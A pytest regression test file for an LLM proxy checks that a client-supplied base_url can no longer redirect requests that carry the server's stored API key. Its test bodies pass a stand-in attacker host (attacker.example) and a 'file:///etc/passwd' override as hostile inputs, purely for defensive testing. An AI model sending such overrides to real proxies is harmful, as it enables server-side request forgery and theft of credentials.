"""Regression tests for the LLM proxy's SSRF / credential-exfiltration surface.

The router used to accept ``base_url`` in the request body. ``resolve_base_url``
returned it verbatim and ``_auth_headers`` then attached the server's stored
provider key, so an unauthenticated caller could make this process issue
``POST <anything>`` carrying ``Authorization: Bearer <real key>``.

These tests pin the closed behaviour. They never touch the network: the httpx
client is replaced with a recorder, so we assert on the URL and headers the
router *would* have sent.
"""
from __future__ import annotations

from typing import Any

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from src.llm import credentials as creds
from src.llm import router as llm_router


class _Recorder:
    """Stands in for httpx.AsyncClient, capturing the outgoing request."""

    calls: list[dict[str, Any]] = []

    def __init__(self, *args, **kwargs) -> None:
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc) -> bool:
        return False

    async def post(self, url, json=None, headers=None, **kwargs):
        _Recorder.calls.append({"url": url, "headers": dict(headers or {}), "json": json})
        return _Response()


class _Response:
    status_code = 200

    def json(self):
        return {"choices": [{"message": {"content": "ok"}}], "usage": {}}

    text = "ok"


@pytest.fixture()
def client(monkeypatch):
    _Recorder.calls = []
    # A stored key is what made the exploit valuable, so make one exist.
    monkeypatch.setattr(creds, "get_api_key", lambda provider: "sk-SENTINEL-DO-NOT-LEAK")
    monkeypatch.setattr(llm_router.httpx, "AsyncClient", _Recorder)
    app = FastAPI()
    app.include_router(llm_router.router)
    with TestClient(app) as c:
        yield c


def test_chat_request_has_no_base_url_field() -> None:
    """The field must not exist -- its absence is the fix."""
    assert "base_url" not in llm_router.ChatRequest.model_fields


def test_chat_url_takes_no_override() -> None:
    """A future caller must not be able to hand a URL to the proxy."""
    import inspect

    params = list(inspect.signature(llm_router._chat_url).parameters)
    assert params == ["provider"], params


def test_client_supplied_base_url_is_ignored(client) -> None:
    """A base_url in the body must not change where the request goes."""
    body = {
        "provider": "deepseek",
        "model": "deepseek-flash",
        "messages": [{"role": "user", "content": "hi"}],
        # Attacker-controlled, and previously honoured verbatim.
        "base_url": "https://attacker.example",
    }
    client.post("/v1/llm/chat/completions", json=body)
    assert _Recorder.calls, "no upstream call was attempted at all"
    for call in _Recorder.calls:
        assert "attacker.example" not in call["url"], call
        assert "127.0.0.1" not in call["url"], call


def test_credentials_are_only_sent_to_the_configured_host(client) -> None:
    """If a call is attempted at all, the key goes to the provider's own host."""
    body = {
        "provider": "deepseek",
        "model": "deepseek-flash",
        "messages": [{"role": "user", "content": "hi"}],
        "base_url": "https://attacker.example",
    }
    client.post("/v1/llm/chat/completions", json=body)
    assert _Recorder.calls, "no upstream call was attempted at all"
    for call in _Recorder.calls:
        # The stored key may only ever travel to the provider's configured host.
        assert "attacker.example" not in call["url"], call
        assert "deepseek" in call["url"], call


def test_resolve_base_url_rejects_a_non_http_override() -> None:
    """Defence in depth: the internal seam refuses non-http(s) schemes."""
    from src.llm.providers import resolve_base_url

    with pytest.raises(ValueError):
        resolve_base_url("deepseek", "file:///etc/passwd")
    with pytest.raises(ValueError):
        resolve_base_url("deepseek", "not a url")
